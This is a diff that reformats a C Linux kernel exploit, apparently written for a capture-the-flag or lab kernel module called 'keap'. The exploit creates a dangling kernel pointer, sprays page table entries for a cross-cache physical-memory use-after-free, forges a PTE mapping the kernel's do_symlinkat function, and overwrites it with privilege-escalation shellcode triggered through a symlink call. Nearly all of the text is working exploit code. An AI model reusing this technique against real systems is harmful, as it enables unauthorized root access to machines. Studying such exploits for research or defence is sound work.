@@ -1,8 +1,8 @@
 #include "libs/pwn.h"
 #include "linux6.6.22/shellcode.h"
+#include <sched.h>
 #include <stdlib.h>
 #include <sys/sendfile.h>
-#include <sched.h>
 #include <sys/wait.h>
 #include <unistd.h>
 
@@ -11,12 +11,13 @@
  *******************************/
 
 /*
- * inspired by https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606#UAF-in-physical-memory
+ * inspired by:
+ * https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606#UAF-in-physical-memory
  * this version overwrites do_symlinkat with privilige escalation shellcode
  */
 
- // can't call logging helpers directly
- //  BUG: Bad page cache in process pwn  pfn:02850
+// can't call logging helpers directly
+//  BUG: Bad page cache in process pwn  pfn:02850
 
 int fd, dmafd, ezfd = -1;
 static void win() {
@@ -37,22 +38,21 @@ static void win() {
 
 uint64_t user_cs, user_ss, user_rsp, user_rflags;
 static void save_state() {
-  asm(
-    "movq %%cs, %0\n"
-    "movq %%ss, %1\n"
-    "movq %%rsp, %2\n"
-    "pushfq\n"
-    "popq %3\n"
-    : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
-    :
-    : "memory");
+  asm("movq %%cs, %0\n"
+      "movq %%ss, %1\n"
+      "movq %%rsp, %2\n"
+      "pushfq\n"
+      "popq %3\n"
+      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
+      :
+      : "memory");
 }
 
 #define N_SPRAY 0x400
 // size for direct cross cache attack
 #define PTE_SIZE 0x10000
 
-int main(int argc, char* argv[]) {
+int main(int argc, char *argv[]) {
   void *ptr;
   uint64_t pte;
   char leak[PTE_SIZE] = {0};
@@ -66,8 +66,8 @@ int main(int argc, char* argv[]) {
   lstage("START");
 
   for (int i = 0; i < N_SPRAY; i++)
-    spray[i] = mmap((void*)(0xdead000000 + i*0x10000), 0x8000,
-                    PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
+    spray[i] = mmap((void *)(0xdead000000 + i * 0x10000), 0x8000,
+                    PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
 
   linfo("create dangeling ptr");
   ptr = keap_malloc(PTE_SIZE, GFP_KERNEL_ACCOUNT);
@@ -77,7 +77,7 @@ int main(int argc, char* argv[]) {
   linfo("spray PTEs");
   for (int i = 0; i < N_SPRAY; i++)
     for (int j = 0; j < 8; j++)
-      *(uint64_t*)(spray[i] + j*0x1000) = 0x6fe1be2;
+      *(uint64_t *)(spray[i] + j * 0x1000) = 0x6fe1be2;
 
 #ifdef DEBUG
   keap_read(ptr, leak, PTE_SIZE);
@@ -95,11 +95,11 @@ int main(int argc, char* argv[]) {
   linfo("find corrupted page");
   void *vuln = 0;
   uint64_t physbase = 0;
-  for (int i = 0; i < N_SPRAY; i ++) {
+  for (int i = 0; i < N_SPRAY; i++) {
     for (int j = 0; j < 8; j++) {
-      if (*(uint64_t*)(spray[i]+j*0x1000) != 0x6fe1be2) {
-        vuln = (uint64_t*)(spray[i]+j*0x1000);
-        physbase = (*(uint64_t*)vuln & ~0xfff);
+      if (*(uint64_t *)(spray[i] + j * 0x1000) != 0x6fe1be2) {
+        vuln = (uint64_t *)(spray[i] + j * 0x1000);
+        physbase = (*(uint64_t *)vuln & ~0xfff);
         break;
       }
     }
@@ -118,7 +118,7 @@ int main(int argc, char* argv[]) {
   // physbase with nokaslr + 0x3000 (only if kaslr is enabled)
   uint64_t offset = 0x2401000 + 0x3000;
 
-  pte = 0x8000000000000067|(physbase+(do_symlinkat_func & ~0xfff)-offset);
+  pte = 0x8000000000000067 | (physbase + (do_symlinkat_func & ~0xfff) - offset);
 
   keap_write(ptr, &pte, 0x8);
 
@@ -128,12 +128,12 @@ int main(int argc, char* argv[]) {
 #endif
 
   // reload pte or sth idk
-  void* old_vuln = vuln;
+  void *old_vuln = vuln;
   vuln = NULL;
-  for (int i = 0; i < N_SPRAY; i ++) {
+  for (int i = 0; i < N_SPRAY; i++) {
     for (int j = 0; j < 8; j++) {
-      if (*(uint64_t*)(spray[i]+j*0x1000) != 0x6fe1be2) {
-        vuln = (uint64_t*)(spray[i]+j*0x1000);
+      if (*(uint64_t *)(spray[i] + j * 0x1000) != 0x6fe1be2) {
+        vuln = (uint64_t *)(spray[i] + j * 0x1000);
         break;
       }
     }
@@ -150,17 +150,19 @@ int main(int argc, char* argv[]) {
   lstage("PRIVESC");
   linfo("preparing shellcode");
   void *p;
-  p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
-  *(size_t*)p = (size_t)&win;
-  p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
-  *(size_t*)p = user_rflags;
-  p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
-  *(size_t*)p = user_rsp;
+  p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22",
+             8);
+  *(size_t *)p = (size_t)&win;
+  p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44",
+             8);
+  *(size_t *)p = user_rflags;
+  p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55",
+             8);
+  *(size_t *)p = user_rsp;
 
   linfo("overwriting do_symlinkat_at");
   memcpy(vuln + (do_symlinkat_func & 0xfff), shellcode, sizeof(shellcode));
 
   linfo("%d", symlink("/jail/x", "/jail"));
   lerror("Failed...");
-
 }
